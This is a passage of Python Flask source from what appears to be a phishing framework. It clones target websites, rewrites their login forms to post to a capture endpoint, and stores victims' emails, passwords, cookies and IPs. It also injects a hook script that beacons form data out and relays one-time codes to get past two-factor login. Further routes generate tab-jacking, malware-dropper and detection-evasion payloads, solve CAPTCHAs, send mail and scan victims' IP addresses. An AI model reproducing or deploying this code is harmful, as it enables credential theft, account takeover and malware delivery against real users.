    if asset_path.suffix.lower() in text_types:
        with open(asset_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        aliases = _get_clone_asset_aliases(clone_id)
        content = _rewrite_clone_asset_refs(content, aliases, clone_id)
        mimetype = 'application/javascript' if asset_path.suffix.lower() in ('.js', '.mjs') else 'text/css'
        return Response(content, mimetype=mimetype)

    return send_from_directory(str(clone_base.resolve()), rel_path or subpath)

def _load_clone_metadata(clone_id):
    """Load metadata.json for a filesystem clone."""
    meta_path = CLONE_STORAGE_DIR / clone_id / 'metadata.json'
    if meta_path.is_file():
        try:
            with open(meta_path, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception:
            pass
    return {}

def _get_config_redirect(cur=None):
    """Return configured redirect URL after credential capture."""
    try:
        if cur is None:
            cur = g.db
        row = cur.execute("SELECT red FROM config LIMIT 1").fetchone()
        if row and row[0]:
            return row[0]
    except Exception:
        pass
    return 'http://localhost:5000'

def _inject_clone_hooks(html, clone_id):
    """Point forms at capture endpoint and inject hook.js."""
    html = html.replace('action=""', f'action="/capture/{clone_id}"')
    html = html.replace("action=''", f"action='/capture/{clone_id}'")
    html = html.replace('action="/"', f'action="/capture/{clone_id}"')
    if '/hook.js' not in html:
        html = html.replace('</body>', '<script src="/hook.js"></script></body>')
    return html

def _save_clone_credentials(cur, original_url, clone_id, form_data):
    """Persist captured credentials from a clone form submission."""
    victim_ip = request.remote_addr
    extracted = extract_credential_fields(form_data, request)
    sql = """INSERT INTO creds(url, jdoc, pdate, browser, bversion, platform, rip,
                               email, username, password, cookies, csrf_tokens,
                               form_fields, captured_metadata)
             VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"""
    d = "{:%m-%d-%Y}".format(date.today())
    creds = (original_url, json.dumps(form_data), d,
             str(request.user_agent.browser) if request.user_agent else 'Unknown',
             str(request.user_agent.version) if request.user_agent else 'Unknown',
             str(request.user_agent.platform) if request.user_agent else 'Unknown',
             victim_ip,
             extracted['email'], extracted['username'], extracted['password'],
             extracted['cookies'], extracted['csrf_tokens'],
             json.dumps(extracted['form_fields']),
             json.dumps({'browser': request.user_agent.browser if request.user_agent else 'Unknown',
                       'platform': request.user_agent.platform if request.user_agent else 'Unknown',
                       'clone_id': clone_id}))
    cur.execute(sql, creds)
    g.db.commit()
    save_victim_session(cur, url=original_url, form_data=form_data, extracted=extracted, clone_id=clone_id)
    last_id = cur.execute("SELECT last_insert_rowid()").fetchone()[0]
    try:
        socketio.emit('credentials_captured', {
            'id': last_id,
            'url': original_url,
            'ip': victim_ip,
            'browser': request.user_agent.browser if request.user_agent else 'Unknown',
            'email': extracted['email'],
            'username': extracted['username']
        }, skip_sid=request.sid, broadcast=True, namespace='/')
        logger.info(f"[CLONE] Credentials captured from {victim_ip} via clone {clone_id}")
    except Exception as e:
        logger.debug(f"[CLONE] Socket event error: {e}")
    return _get_config_redirect(cur)

# Serve cloned website with proper form redirection
@app.route("/clone/<clone_id>/", methods=['GET', 'POST'])
@app.route("/clone/<clone_id>/<path:subpath>", methods=['GET', 'POST'])
@csrf_protect.exempt
def serve_clone(clone_id, subpath=''):
    """
    Serve cloned website content from templates/clones/<clone_id>/.
    Falls back to lure_urls lookup for legacy hash-based lures.
    """
    try:
        cur = g.db
        clone_base = CLONE_STORAGE_DIR / clone_id

        # Serve filesystem clones created by RealCloner / Recording Studio
        if clone_base.is_dir():
            metadata = _load_clone_metadata(clone_id)
            original_url = metadata.get('original_url', clone_id)

            if subpath:
                asset_response = _serve_clone_asset(clone_id, clone_base, subpath)
                if not asset_response:
                    lower = subpath.lower()
                    if lower.endswith('.js') or lower.endswith('.mjs'):
                        return Response('export default {};', mimetype='application/javascript')
                    if lower.endswith(('.woff', '.woff2', '.ttf', '.eot', '.otf')):
                        return Response(b'', mimetype='font/woff2', status=204)
                    return '<!DOCTYPE html><html><head><title>404</title></head><body><h1>Not found</h1></body></html>', 404
                return asset_response

            if request.method == 'POST':
                form_data = request.form.to_dict()
                redirect_url = _save_clone_credentials(cur, original_url, clone_id, form_data)
                return redirect(redirect_url)

            index_path = _safe_clone_path(clone_id)
            if not index_path:
                return '<!DOCTYPE html><html><head><title>404</title></head><body><h1>Clone not found</h1></body></html>', 404

            with open(index_path, 'r', encoding='utf-8', errors='ignore') as f:
                cloned_html = _inject_clone_hooks(f.read(), clone_id)
            logger.info(f"[CLONE] Served filesystem clone {clone_id}")
            return cloned_html, 200, {'Content-Type': 'text/html; charset=UTF-8'}

        # Legacy lure-based clone lookup
        clone_record = cur.execute("""
            SELECT template_id, full_url, target_url FROM lure_urls
            WHERE lure_hash = ? LIMIT 1
        """, (clone_id,)).fetchone()

        if not clone_record:
            return '<!DOCTYPE html><html><head><title>404</title></head><body><h1>Clone not found</h1></body></html>', 404

        template_id, full_url, target_url = clone_record[0], clone_record[1], clone_record[2]
        original_url = target_url if target_url else full_url
        victim_ua = request.headers.get('User-Agent', 'Unknown')

        cur.execute("""
            UPDATE lure_urls SET click_count = click_count + 1
            WHERE lure_hash = ?
        """, (clone_id,))
        g.db.commit()

        agent_hash = hashlib.md5(victim_ua.encode()).hexdigest()[:8]
        url_hash = hashlib.md5(original_url.encode()).hexdigest()[:8]
        clone_file_path = f'templates/fake/{agent_hash}/{url_hash}/index.html'

        cloned_html = None
        try:
            with open(clone_file_path, 'r', encoding='utf-8', errors='ignore') as f:
                cloned_html = f.read()
        except FileNotFoundError:
            try:
                clone_result = clone(original_url, victim_ua, beef='yes')
                if clone_result:
                    with open(clone_file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        cloned_html = f.read()
            except Exception as e:
                logger.warning(f"[CLONE] On-demand clone failed: {e}")

        if not cloned_html:
            cloned_html = f'''<!DOCTYPE html><html><head><title>Login</title></head><body>
                <form method="POST" action="/capture/{clone_id}">
                    <input type="text" name="email" placeholder="Email" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Login</button>
                </form><script src="/hook.js"></script></body></html>'''
        else:
            cloned_html = _inject_clone_hooks(cloned_html, clone_id)

        if request.method == 'POST':
            redirect_url = _save_clone_credentials(cur, original_url, clone_id, request.form.to_dict())
            return redirect(redirect_url)

        return cloned_html, 200, {'Content-Type': 'text/html; charset=UTF-8'}

    except Exception as e:
        logger.error(f"[CLONE] Error serving clone {clone_id}: {str(e)}")
        return f'<!DOCTYPE html><html><body><h1>Error</h1><p>{str(e)}</p></body></html>', 500

# Configure endpoint - handles clone configuration from admin panel
@app.route("/configure", methods=['POST'])
@flask_login.login_required
@csrf_protect.exempt
def configure():
    """Configure clone settings - receives settings from admin panel"""
    try:
        cur = g.db
        payload = request.get_json(silent=True) if request.is_json else None
        source = payload if payload else request.form

        # Extract parameters from form or JSON
        url = (source.get('url') or 'http://localhost:5000').strip()
        redirect_url = (source.get('red') or source.get('redirect_url') or 'http://localhost:5000').strip()
        webhook_url = (source.get('webhook') or '').strip()
        status = (source.get('status') or 'clone').strip()
        beef = (source.get('beef') or 'no').strip()
        save_clone_raw = source.get('save_clone')
        if save_clone_raw is None or str(save_clone_raw).strip() == '':
            save_clone = 'yes' if status == 'clone' else 'no'
        else:
            save_clone = str(save_clone_raw).strip().lower()
        auto_lure = (source.get('auto_lure') or 'no').strip()
        auto_template = (source.get('auto_template') or 'no').strip()
        template_name = (source.get('template_name') or '').strip()
        clone_id = (source.get('clone_id') or '').strip()
        
        # Validate URLs
        if len(url) > 4:
            if 'http://' not in url and 'https://' not in url:
                url = 'http://' + url
        
        if len(redirect_url) > 4:
            if 'http://' not in redirect_url and 'https://' not in redirect_url:
                redirect_url = 'http://' + redirect_url
        else:
            redirect_url = 'http://localhost:5000'

        attack_url = None
        clone_error_msg = None
        should_clone = status == 'clone' and url and 'localhost:5000/custom' not in url
        if save_clone == 'no':
            should_clone = False

        if not clone_id and status == 'clone' and url:
            for variant in _clone_url_variants(url):
                derived_id = _find_clone_id_for_url(variant)
                if derived_id and (Path('templates/clones') / derived_id / 'index.html').exists():
                    clone_id = derived_id
                    attack_url = f'/clone/{clone_id}/'
                    logger.info(f"[CONFIGURE] Using existing clone: {clone_id}")
                    break

        if should_clone and not clone_id:
            cloner = RealCloner()
            for attempt_url in _clone_url_variants(url):
                try:
                    logger.info(f"[CONFIGURE] Cloning {attempt_url}...")
                    clone_result = cloner.clone_website(attempt_url, include_assets=True)
                    if clone_result.get('status') == 'ok':
                        clone_id = clone_result['clone_id']
                        attack_url = clone_result.get('clone_url', f'/clone/{clone_id}/')
                        url = attempt_url
                        logger.info(f"[CONFIGURE] Website cloned: {clone_id}")
                        break
                    clone_error_msg = clone_result.get('message', 'Clone failed')
                    logger.warning(f"[CONFIGURE] Clone attempt failed for {attempt_url}: {clone_error_msg}")
                except Exception as clone_error:
                    clone_error_msg = str(clone_error)
                    logger.warning(f"[CONFIGURE] Clone step failed for {attempt_url}: {clone_error}")
        
        # Save configuration to database
        cur.execute("DELETE FROM config")
        try:
            cur.execute("""INSERT INTO config(url, red, status, beef, clone_id) 
                           VALUES(?, ?, ?, ?, ?)""",
                        (url, redirect_url, status, beef, clone_id or None))
        except sqlite3.OperationalError:
            cur.execute("""INSERT INTO config(url, red, status, beef) 
                           VALUES(?, ?, ?, ?)""",
                        (url, redirect_url, status, beef))
        
        # Save template if auto_template is enabled
        if auto_template == 'yes' and template_name:
            try:
                cur.execute("""INSERT INTO templates(name, base_url, url, status, beef, webhook) 
                               VALUES(?, ?, ?, ?, ?, ?)""",
                            (template_name, url, url, status, beef, webhook_url))
            except Exception as e:
                # If beef column doesn't exist, insert without it
                if 'beef' in str(e) or 'no column' in str(e):
                    cur.execute("""INSERT INTO templates(name, base_url, url, status, webhook) 
                                   VALUES(?, ?, ?, ?, ?)""",
                                (template_name, url, url, status, webhook_url))
                else:
                    raise
        
        g.db.commit()
        
        logger.info(f"[CONFIGURE] Clone configured: url={url}, redirect={redirect_url}, status={status}, clone_id={clone_id}")

        victim_entry = request.host_url.rstrip('/') + '/'
        clone_preview = request.host_url.rstrip('/') + (attack_url or (f'/clone/{clone_id}/' if clone_id else ''))
        if status == 'clone' and not clone_id:
            msg = clone_error_msg or 'Clone failed — no clone files were created. Check the target URL and try Recording Studio.'
            return jsonify({
                'status': 'error',
                'message': msg,
                'url': url,
                'redirect': redirect_url,
                'clone_id': '',
            }), 400

        return jsonify({
            'status': 'ok',
            'message': 'Configuration saved successfully',
            'url': url,
            'redirect': redirect_url,
            'clone_id': clone_id,
            'attack_url': victim_entry,
            'clone_url': clone_preview if clone_id else None,
        })
    except Exception as e:
        logger.error(f"[CONFIGURE] Error: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 400

# Live OTP Panel - WebSocket endpoint
@socketio.on('otp_listen')
def otp_listen(data):
    """Listen for OTP codes on victim's browser"""
    session_id = data.get('session_id')
    join_room(f"otp_{session_id}")
    emit('status', {'message': 'Listening for OTP'})

@socketio.on('otp_received')
def otp_received(data):
    """Operator received/received OTP code"""
    session_id = data.get('session_id')
    otp_code = data.get('otp_code')
    
    # Emit to victim's browser to inject OTP
    emit('inject_otp', {'otp_code': otp_code}, room=f"otp_{session_id}")
    
    # Log OTP event
    cur = g.db
    cur.execute("""
        INSERT INTO analyzer_logs(session_id, detection_type, detection_value)
        VALUES(?, ?, ?)
    """, (session_id, 'otp_injected', otp_code))
    g.db.commit()

# Browser Hook Injection - Receives browser interactions when webhook injection enabled
@app.route("/js", methods=['GET', 'POST', 'OPTIONS'])
@csrf_protect.exempt
def browser_hook():
    """
    JavaScript injection endpoint for webhook-based browser hooking.
    Returns hook injection script on GET, receives events on POST
    """
    if request.method == 'GET':
        # Return the hook injection script that captures browser interactions
        hook_script = """
(function() {
    // Browser hook injection for real-time monitoring
    const hookUrl = 'http://localhost:5000/js';
    
    // Capture form submissions
    document.addEventListener('submit', function(e) {
        const formData = new FormData(e.target);
        const data = Object.fromEntries(formData);
        navigator.sendBeacon(hookUrl, JSON.stringify({
            type: 'form_submit',
            data: data,
            url: window.location.href,
            timestamp: new Date().toISOString()
        }));
    });
    
    // Capture input changes
    document.addEventListener('change', function(e) {
        if (e.target.type === 'text' || e.target.type === 'password' || e.target.type === 'email') {
            navigator.sendBeacon(hookUrl, JSON.stringify({
                type: 'input_change',
                field: e.target.name || e.target.id,
                fieldType: e.target.type,
                timestamp: new Date().toISOString()
            }));
        }
    });
    
    // Capture clicks on sensitive elements
    document.addEventListener('click', function(e) {
        if (e.target.tagName === 'BUTTON' || (e.target.tagName === 'A' && e.target.href)) {
            navigator.sendBeacon(hookUrl, JSON.stringify({
                type: 'click',
                element: e.target.tagName,
                text: e.target.textContent.substring(0, 50),
                href: e.target.href || null,
                timestamp: new Date().toISOString()
            }));
        }
    });
})();
"""
        return hook_script, 200, {'Content-Type': 'application/javascript'}
    
    elif request.method == 'POST':
        # Log browser hook interactions
        try:
            if request.is_json:
                event = request.get_json()
            else:
                event = request.get_data(as_text=True)
            
            cur = g.db
            
            # Log to database
            try:
                cur.execute("""
                    INSERT INTO analyzer_logs(session_id, detection_type, detection_value)
                    VALUES(?, ?, ?)
                """, ('webhook_hook', 'browser_interaction', str(event)))
                g.db.commit()
                logger.info(f"[WEBHOOK] Browser interaction logged: {event}")
            except:
                pass  # Ignore logging errors
            
            return '', 204  # No content response
        except Exception as e:
            logger.error(f"[WEBHOOK] Error processing hook: {str(e)}")
            return '', 500
    
    elif request.method == 'OPTIONS':
        # Handle CORS preflight requests
        return '', 204

# Webhook Management - Add/delete webhooks
@app.route("/webhooks", methods=['GET', 'POST'])
@flask_login.login_required
def manage_webhooks():
    """Add webhook notification for template"""
    if request.method == 'POST':
        data = request.json or request.form
        template_id = data.get('template_id')
        webhook_url = data.get('webhook_url')
        webhook_type = data.get('webhook_type', 'json')
        trigger_on = data.get('trigger_on', 'credential_submit')
        
        cur = g.db
        cur.execute("""
            INSERT INTO webhooks(template_id, webhook_url, webhook_type, trigger_on)
            VALUES(?, ?, ?, ?)
        """, (template_id, webhook_url, webhook_type, trigger_on))
        g.db.commit()
        
        return jsonify({'status': 'ok', 'message': 'Webhook added'})
    
    # GET - list webhooks
    cur = g.db
    webhooks = cur.execute("SELECT id, template_id, webhook_url, webhook_type, trigger_on FROM webhooks").fetchall()
    
    if request.headers.get('Accept') == 'application/json':
        return jsonify([{
            'id': w[0],
            'template_id': w[1],
            'webhook_url': w[2],
            'webhook_type': w[3],
            'trigger_on': w[4]
        } for w in webhooks])
    
    return render_template('admin/webhooks.html', webhooks=webhooks)

# Sessions - View captured sessions
@app.route("/sessions", methods=['GET'])
@flask_login.login_required
def list_sessions():
    """List all captured victim sessions"""
    cur = g.db
    sessions = cur.execute("""
        SELECT id, template_id, session_hash, victim_ip, victim_ua, submission_timestamp
        FROM sessions ORDER BY submission_timestamp DESC LIMIT 100
    """).fetchall()
    
    session_list = []
    for s in sessions:
        session_list.append({
            'id': s[0],
            'template_id': s[1],
            'session_hash': s[2],
            'victim_ip': s[3],
            'victim_ua': s[4],
            'timestamp': s[5]
        })
    
    if request.headers.get('Accept') == 'application/json':
        return jsonify(session_list)
    
    return render_template('admin/sessions.html', sessions=session_list)

# Session Details
@app.route("/session/<int:session_id>", methods=['GET'])
@flask_login.login_required
def get_session(session_id):
    """Get detailed session data"""
    cur = g.db
    session = cur.execute("""
        SELECT id, template_id, session_hash, victim_ip, victim_ua, form_data, submitted_credentials, submission_timestamp
        FROM sessions WHERE id = ?
    """, (session_id,)).fetchone()
    
    if not session:
        return jsonify({'status': 'error', 'message': 'Session not found'}), 404
    
    # Get cookies
    cookies = cur.execute("SELECT name, value, domain, path FROM cookies WHERE session_id = ?", (session_id,)).fetchall()
    
    return jsonify({
        'id': session[0],
        'template_id': session[1],
        'session_hash': session[2],
        'victim_ip': session[3],
        'victim_ua': session[4],
        'form_data': json.loads(session[5] if session[5] else '{}'),
        'credentials': json.loads(session[6] if session[6] else '{}'),
        'timestamp': session[7],
        'cookies': [{
            'name': c[0],
            'value': c[1],
            'domain': c[2],
            'path': c[3]
        } for c in cookies]
    })

#================================================================================================================================

@app.route('/logout')
def logout():
    flask_login.logout_user()
    return redirect('/neptune')

@login_manager.unauthorized_handler
def unauthorized_handler():
    user_id = getattr(flask_login.current_user, 'id', 'NONE')
    session_data = dict(request.cookies) if request.cookies else {}
    logger.warning(f"[UNAUTHORIZED] User ID: {user_id}, Session: {session_data}, Path: {request.path}")
    return redirect('/neptune')

#--------------------------------------------------------------------------------------------------------------------------------
# MOBILE API

# VERIFICAR CHAVE
@app.route("/api/checkKey/<key>", methods=['GET'])
def checkKey(key):
    cur = g.db
    ensure_socialfish_row(cur)
    tokenapi = sf_get(cur, 'token', '')
    if key == tokenapi:
        status = {'status':'ok'}
    else:
        status = {'status':'bad'}
    return jsonify(status)

@app.route("/api/statistics/<key>", methods=['GET'])
def getStatics(key):
    cur = g.db
    ensure_socialfish_row(cur)
    tokenapi = sf_get(cur, 'token', '')
    if key == tokenapi:
        cur = g.db
        attacks = sf_get(cur, 'attacks', 0)
        clicks = sf_get(cur, 'clicks', 0)
        countC = countCreds()
        countNPU = countNotPickedUp()
        info = {'status':'ok','attacks':attacks, 'clicks':clicks, 'countCreds':countC, 'countNotPickedUp':countNPU}
    else:
        info = {'status':'bad'}
    return jsonify(info)

@app.route("/api/getJson/<key>", methods=['GET'])
def getJson(key):
    cur = g.db
    ensure_socialfish_row(cur)
    tokenapi = sf_get(cur, 'token', '')
    if key == tokenapi:
        try:
            sql = "SELECT * FROM creds"
            cur = g.db
            credInfo = cur.execute(sql).fetchall()
            listCreds = []
            if len(credInfo) > 0:
                for c in credInfo:
                    cred = {'id':c[0],'url':c[1], 'post':c[2], 'date':c[3], 'browser':c[4], 'version':c[5],'os':c[6],'ip':c[7]}
                    listCreds.append(cred)
            else:
                credInfo = {'status':'nothing'}
            return jsonify(listCreds)
        except:
            return "Bad parameter"
    else:
        credInfo = {'status':'bad'}
        return jsonify(credInfo)

@app.route('/api/configure', methods = ['POST'])
@csrf_protect.exempt
def postConfigureApi():
    if request.is_json:
        content = request.get_json()
        cur = g.db
        ensure_socialfish_row(cur)
        tokenapi = sf_get(cur, 'token', '')
        if content.get('key') == tokenapi:
            red = content.get('red', 'http://localhost:5000')
            beef = content.get('beef', 'no')
            sta = content.get('sta', 'custom')
            
            if sta == 'clone':
                url = content.get('url', 'http://localhost:5000')
            else:
                url = 'Custom'

            if url != 'Custom':
                if len(url) > 4:
                    if 'http://' not in url and sta != '1' and 'https://' not in url:
                        url = 'http://' + url
            if len(red) > 4:
                if 'http://' not in red and 'https://' not in red:
                    red = 'http://' + red
            else:
                red = 'http://localhost:5000'
            
            # Store in database instead of global variables
            cur.execute("DELETE FROM config")
            cur.execute("INSERT INTO config(url, red, status, beef) VALUES(?, ?, ?, ?)",
                        (url, red, sta, beef))
            cur.execute("UPDATE socialfish SET attacks = attacks + 1 WHERE id = 1")
            g.db.commit()
            status = {'status':'ok'}
        else:
            status = {'status':'bad'}
    else:
        status = {'status':'bad'}
    return jsonify(status)

@app.route("/api/mail", methods=['POST'])
def postSendMail():
    if request.is_json:
        content = request.get_json()
        cur = g.db
        ensure_socialfish_row(cur)
        tokenapi = sf_get(cur, 'token', '')
        if content['key'] == tokenapi:
            subject = content['subject']
            email = content['email']
            password = content['password']
            recipient = content['recipient']
            body = content['body']
            smtp = content['smtp']
            port = content['port']
            if sendMail(subject, email, password, recipient, body, smtp, port) == 'ok':
                cur = g.db
                cur.execute("UPDATE sfmail SET email = ? WHERE id = 1", (email,))
                cur.execute("UPDATE sfmail SET smtp = ? WHERE id = 1", (smtp,))
                cur.execute("UPDATE sfmail SET port = ? WHERE id = 1", (port,))
                g.db.commit()
                status = {'status':'ok'}
            else:
                status = {'status':'bad','error':str(sendMail(subject, email, password, recipient, body, smtp, port))}
        else:
            status = {'status':'bad'}
    else:
        status = {'status':'bad'}
    return jsonify(status)

@app.route("/api/trace/<key>/<ip>", methods=['GET'])
def getTraceIpMob(key, ip):
    import re
    cur = g.db
    ensure_socialfish_row(cur)
    tokenapi = sf_get(cur, 'token', '')
    
    # Validate IP format
    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$|^127\.0\.0\.1$|^::1$|^[a-f0-9:]+$'
    
    if not re.match(ip_pattern, ip):
        return jsonify({'status':'bad', 'error': 'Invalid IP format'})
    
    if key == tokenapi:
        try:
            traceIp = tracegeoIp(ip)
            return jsonify(traceIp)
        except Exception as e:
            print(f'[-] API trace error: {str(e)}')
            content = {'status':'bad', 'error': 'Trace failed'}
            return jsonify(content)
    else:
        content = {'status':'bad'}
        return jsonify(content)

@app.route("/api/scansf/<key>/<ip>", methods=['GET'])
def getScanSfMob(key, ip):
    import re
    cur = g.db
    ensure_socialfish_row(cur)
    tokenapi = sf_get(cur, 'token', '')
    
    # Validate IP format
    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$|^127\.0\.0\.1$|^::1$|^[a-f0-9:]+$'
    
    if not re.match(ip_pattern, ip):
        return jsonify({'status':'bad', 'error': 'Invalid IP format'})
    
    if key == tokenapi:
        try:
            return jsonify(nScan(ip))
        except Exception as e:
            print(f'[-] API scan error: {str(e)}')
            return jsonify({'status':'bad', 'error': 'Scan failed'})
    else:
        content = {'status':'bad'}
        return jsonify(content)

@app.route("/api/infoReport/<key>", methods=['GET'])
def getReportMob(key):
    cur = g.db
    ensure_socialfish_row(cur)
    tokenapi = sf_get(cur, 'token', '')
    if key == tokenapi:
        urls = cur.execute("SELECT url FROM creds").fetchall()
        users = cur.execute("SELECT name FROM professionals").fetchall()
        comp = cur.execute("SELECT name FROM companies").fetchall()
        uniqueUrls = []
        professionals = []
        companies = []
        for c in comp:
            companies.append(c[0])
        for p in users:
            professionals.append(p[0])
        for u in urls:
            if u not in uniqueUrls:
                uniqueUrls.append(u[0])
        info = {'urls':uniqueUrls,'professionals':professionals, 'companies':companies}
        return jsonify(info)
    else:
        return jsonify({'status':'bad'})

#================================================================================================================================
# ADVANCED ATTACK TECHNIQUES (v3.0+)

# Selenium Browser Control
@app.route("/selenium/record", methods=['POST'])
@flask_login.login_required
def selenium_record():
    """Start Selenium recording session"""
    data = request.json or request.form
    target_url = data.get('url')
    browser = data.get('browser', 'chrome')
    headless = data.get('headless', 'true').lower() == 'true'
    
    try:
        recorder = SeleniumRecorder(browser=browser, headless=headless)
        recorder.init_driver()
        
        return jsonify({
            'status': 'ok',
            'message': 'Selenium recording started',
            'browser': browser,
            'headless': headless
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Tab Jacking - Hijack victim's browser tab
@app.route("/attack/tabjack", methods=['POST'])
@flask_login.login_required
def tab_jacking():
    """Generate tab jacking payload"""
    data = request.json or request.form
    target_url = data.get('target_url')
    clone_url = data.get('clone_url')
    
    if data.get('type') == 'html':
        payload = TabJacking.generate_tabjack_html(clone_url, target_url)
        return render_template_string(payload)
    else:
        payload = TabJacking.generate_tabjack_payload(target_url)
        return jsonify({
            'status': 'ok',
            'payload': payload,
            'type': 'javascript'
        })

# File Upload Injection - Drop malicious files
@app.route("/attack/file-upload", methods=['POST'])
@flask_login.login_required
def file_upload_injection():
    """Generate file upload/malware dropper payload"""
    data = request.json or request.form
    file_url = data.get('file_url')
    filename = data.get('filename', 'update.exe')
    malware_mode = data.get('malware_mode', 'false').lower() == 'true'
    
    if malware_mode:
        payload = FileUploadInjection.generate_malware_dropper_html(file_url)
        return render_template_string(payload)
    else:
        payload = FileUploadInjection.generate_file_upload_payload(file_url, filename)
        return jsonify({
            'status': 'ok',
            'payload': payload,
            'type': 'javascript'
        })

# Advanced Stealth - Anti-detection techniques
@app.route("/attack/stealth", methods=['GET', 'POST'])
@flask_login.login_required
def advanced_stealth():
    """Get stealth evasion payloads"""
    stealth_type = request.args.get('type', 'perfection')
    
    if stealth_type == 'perfection':
        payload = AdvancedStealth.generate_perfection_js()
    elif stealth_type == 'fingerprint':
        payload = AdvancedStealth.generate_fingerprint_evasion()
    else:
        return jsonify({'status': 'error', 'message': 'Unknown stealth type'}), 400
    
    return jsonify({
        'status': 'ok',
        'stealth_type': stealth_type,
        'payload': payload,
        'size': len(payload),
        'description': 'Inject into cloned page to evade detection'
    })

# CAPTCHA Detection & Solving
@app.route("/attack/captcha/detect", methods=['POST'])
@flask_login.login_required
def captcha_detect():
    """Detect CAPTCHA on page"""
    data = request.json or request.form
    page_html = data.get('html')
    
    if not page_html:
        return jsonify({'status': 'error', 'message': 'HTML required'}), 400
    
    solver = CAPTCHASolver()
    detections = solver.detect_captcha(page_html, [])
    
    return jsonify({
        'status': 'ok',
        'detections': detections,
        'has_captcha': detections['has_captcha'],
        'captcha_type': detections['captcha_type']
    })

# CAPTCHA Solving Setup
@app.route("/attack/captcha/solve", methods=['POST'])
@flask_login.login_required
def captcha_solve():
    """Setup CAPTCHA solving service"""
    data = request.json or request.form
    service = data.get('service', '2captcha')  # 2captcha, anticaptcha, manual
    api_key = data.get('api_key')
    
    try:
        solver = CAPTCHASolver(service=service, api_key=api_key)
        
        # Store solver config in DB (future enhancement)
        return jsonify({
            'status': 'ok',
            'service': service,
            'message': f'CAPTCHA solver configured: {service}'
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Mock Login Server - Test environment
@app.route("/mock-server/start", methods=['POST'])
@flask_login.login_required
def mock_server_start():
    """Start mock login server for testing"""
    data = request.json or request.form
    port = data.get('port', 5001)
    
    try:
        # Start mock server in background thread
        import threading
        server = MockLoginServer(port=port)
        
        thread = threading.Thread(target=server.run, daemon=True)
        thread.start()
        
        return jsonify({
            'status': 'ok',
            'port': port,
            'message': f'Mock server started on port {port}',
            'endpoints': {
                'login': f'http://localhost:{port}/login',
                'oauth': f'http://localhost:{port}/oauth/authorize',
                'sso': f'http://localhost:{port}/sso/login',
                'api_users': f'http://localhost:{port}/api/users',
                'api_sessions': f'http://localhost:{port}/api/sessions'
            }
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Recording Studio - Choose recorder type
def emit_recording_log(event_type, message, **kwargs):
    """Emit recording events to connected clients via WebSocket"""
    try:
        socketio.emit(event_type, {
            'message': message,
            'type': event_type,
            'timestamp': datetime.datetime.now().isoformat(),
            **kwargs
        })
    except Exception as e:
        logger.debug(f"Failed to emit WebSocket event {event_type}: {e}")

@app.route("/studio/recorder", methods=['GET', 'POST'])
@flask_login.login_required
@csrf_protect.exempt
def recording_studio():
    """Real recording studio with AI page analysis and cloning"""
    if request.method == 'GET':
        # Use the new real recording studio template
        return render_template('admin/recording_studio_real.html')
    
    # POST - Real website cloning and analysis
    data = request.json or request.form
    recorder_type = data.get('type', 'playwright')
    target_url = data.get('url')
    redirect_url = (data.get('redirect_url') or data.get('red') or 'http://localhost:5000').strip()
    browser = data.get('browser', 'chrome')
    headless = data.get('headless', 'true').lower() == 'true'
    
    if not target_url:
        return jsonify({'status': 'error', 'message': 'URL required'}), 400
    
    try:
        # Step 1: Fetch and analyze page structure
        socketio.emit('recorder_log', {'message': f"[*] Fetching {target_url}", 'type': 'info'})
        
        cloner = RealCloner()
        
        # Get initial HTML
        import requests
        session = requests.Session()
        session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        response = session.get(target_url, timeout=15)
        response.raise_for_status()
        
        socketio.emit('recorder_log', {'message': f"[+] Page fetched ({len(response.content)} bytes)", 'type': 'success'})
        
        # Step 2: Analyze page with AI
        socketio.emit('recorder_log', {'message': "[*] Analyzing page structure with AI...", 'type': 'info'})
        
        analyzer = PageAnalyzer(response.text, target_url)
        analysis = analyzer.analyze()
        
        socketio.emit('recorder_log', {
            'message': f"[+] Page analysis complete - Auth type: {analysis['auth_type']['type'].upper()}",
            'type': 'success'
        })
        
        # Emit detected auth info
        if analysis['auth_type']['providers']:
            socketio.emit('recorder_log', {
                'message': f"[*] Detected providers: {', '.join(analysis['auth_type']['providers'])}",
                'type': 'info'
            })
        
        # Step 3: Real cloning
        socketio.emit('recorder_log', {'message': "[*] Cloning website...", 'type': 'info'})
        
        clone_result = cloner.clone_website(target_url, include_assets=True)
        
        if clone_result['status'] != 'ok':
            raise Exception(clone_result.get('message', 'Clone failed'))
        
        clone_id = clone_result['clone_id']
        socketio.emit('recorder_log', {
            'message': f"[+] Website cloned successfully: {clone_id}",
            'type': 'success'
        })
        
        # Step 4: Test authentication flows
        socketio.emit('recorder_log', {'message': "[*] Testing authentication flows...", 'type': 'info'})
        
        auth_tester = AdvancedAuthFlowTester(target_url)
        auth_flows = {}
        
        if 'oauth' in analysis['auth_type']['type'].lower():
            auth_flows['oauth2'] = auth_tester.test_auth_flow('oauth2')
            socketio.emit('recorder_log', {'message': "[+] OAuth 2.0 flow tested", 'type': 'success'})
        
        if 'sso' in analysis['auth_type']['type'].lower() or 'saml' in str(analysis['auth_type']['providers']).lower():
            auth_flows['saml'] = auth_tester.test_auth_flow('saml')
            socketio.emit('recorder_log', {'message': "[+] SAML flow tested", 'type': 'success'})
        
        if analysis['auth_type']['flow'] == 'multi_factor':
            auth_flows['2fa'] = auth_tester.test_auth_flow('2fa')
            socketio.emit('recorder_log', {'message': "[+] 2FA flow detected and documented", 'type': 'success'})
        
        # Step 5: Extract CSRF tokens
        socketio.emit('recorder_log', {
            'message': f"[+] Extracted {len(analysis['csrf_tokens'])} CSRF tokens",
            'type': 'success'
        })
        
        # Step 6: Detect injection points
        socketio.emit('recorder_log', {
            'message': f"[+] Found {len(analysis['payload_injection_points'])} injection points",
            'type': 'success'
        })
        
        # Emit form detection
        socketio.emit('form_detected', {
            'count': len(analysis['forms']),
            'form_name': 'Multiple' if len(analysis['forms']) > 1 else 'Single'
        })
        
